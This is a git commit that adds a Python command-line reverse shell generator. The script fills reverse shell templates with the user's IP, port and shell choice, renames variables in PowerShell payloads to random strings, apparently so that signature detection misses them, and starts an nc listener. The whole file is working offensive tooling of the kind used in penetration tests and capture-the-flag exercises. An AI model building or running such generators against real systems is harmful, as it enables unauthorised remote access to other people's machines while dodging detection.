4f10d784b27b7c545467d85ffb94c05da1d3c7a0
Gipsz Jakab <gipsz@jakab.com>
2024-02-16 21:28:12 +0100

    first commit

---
+++ README.md
@@ -0,0 +1,2 @@
+# CLI Reverse shell generator
+#### inspired by [https://github.com/0dayCTF/reverse-shell-generator](https://github.com/0dayCTF/reverse-shell-generator)
---
+++ revshell.py
@@ -0,0 +1,89 @@
+import json
+import os
+import random
+
+def main():
+    command = get_rev_shell()
+    print(20*"-")
+    lhost = get_my_ip()
+    print(20*"-")
+    lport = input(f'[+] Choose a port: ')
+    print(20*"-")
+    shell = get_shell()
+    print(20*"-")
+    command = command.replace("{ip}", lhost)
+    command = command.replace("{port}", lport)
+    command = command.replace("{shell}", shell)
+    print(command)
+    start_listener(lport)
+
+def start_listener(lport: str):
+    option = input("[?] Start listener? (y/n)\n")
+    if option.lower() == "y":
+        if lport in ["80", "443", "22", "21", "53"]:
+            os.system(f'sudo nc -nlvp {lport}')
+        else:
+            os.system(f'nc -nlvp {lport}')
+
+def get_rev_shell():
+    with open("revshells.json", "r") as j:
+        data = json.loads(j.read())    
+    counter = 1
+    opsys = rev_shell_type()
+    for d in data:
+        if opsys in d["meta"]:
+            print(f'[{counter}] {d["name"]}')
+        counter += 1    
+    option = int(input(f'[+] Choose a revshell: '))-1
+    if "powershell" in data[option]["name"].lower():
+        command = randomize_powershell_variables(data[option]["command"])
+    else:
+        command = data[option]["command"]
+    return command
+
+def rev_shell_type():
+    opsys = ["linux", "mac", "windows"]
+    c = 1
+    for op in opsys:
+        print(f'[{c}] {op}')
+        c += 1
+    option = int(input("[+] Choose OS: "))-1
+    return opsys[option]
+
+def get_my_ip():    
+    myips = os.popen('hostname -I').read().split(' ')
+    myips.pop()
+    counter = 1
+    for ip in myips:
+        print(f'[{counter}] {ip}')
+        counter +=1
+    lhost = int(input(f'[+] Choose LHOST: '))-1
+    return myips[lhost]
+
+def randomize_powershell_variables(command: str):
+    bad_vars = ["$LHOST", "$LPORT", "$TCPClient", "$NetworkStream", "$StreamReader", "$StreamWriter", "$Buffer", "$RawData", "$Code", "$Output", "$client", "$stream", "$data", "$sendback2", "$sendback", "$sendbyte", "$bytes"]
+    for var in bad_vars:
+        new_var = random_variable_generator()
+        command = command.replace(var, new_var)
+    return command
+
+def random_variable_generator():    
+    abc = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ_"
+    new_var = "$"
+    for i in range(8):
+        new_var += random.choice(abc)
+    return new_var
+
+
+
+def get_shell():
+    shells = ['sh', '/bin/sh', 'bash', '/bin/bash', 'cmd', 'powershell', 'pwsh', 'ash', 'bsh', 'csh', 'ksh', 'zsh', 'pdksh', 'tcsh', 'mksh', 'dash']
+    counter = 1
+    for sh in shells:
+        print(f'[{counter}] {sh}')
+        counter += 1
+    index = int(input("[+] Choose a shell: "))-1
+    return shells[index]
+
+if __name__ == "__main__":
+    main()
